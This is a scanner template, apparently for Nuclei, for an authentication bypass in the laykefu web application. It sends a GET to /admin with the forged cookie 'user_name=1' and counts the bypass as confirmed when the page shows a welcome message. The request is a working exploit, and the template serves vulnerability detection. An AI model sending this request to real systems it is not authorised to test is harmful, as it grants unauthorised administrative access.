id: laykefu-cookie-bypass
info:
  name: laykefu-cookie-bypass
  author: apple
  severity: high
  description: When the "user" in the cookie_ When the name is not empty, login can be bypassed. To verify the vulnerability, we use the browser plugin "ModHeader - Modify HTTP headers", set the value of the cookie to "username=1", and access the backend address can directly enter the backend.
  reference:
    - https://github.com/VeryReds/laykefu-front-end-bypass/blob/main/laykefu%E5%89%8D%E7%AB%AF%E7%BB%95%E8%BF%87.md
  tags: tags
http:
  - raw:
      - |+
        GET /admin HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Cookie: user_name=1
        Connection: close
        Upgrade-Insecure-Requests: 1

    matchers:
      - type: word
        part: body
        words:
          - '欢迎您'
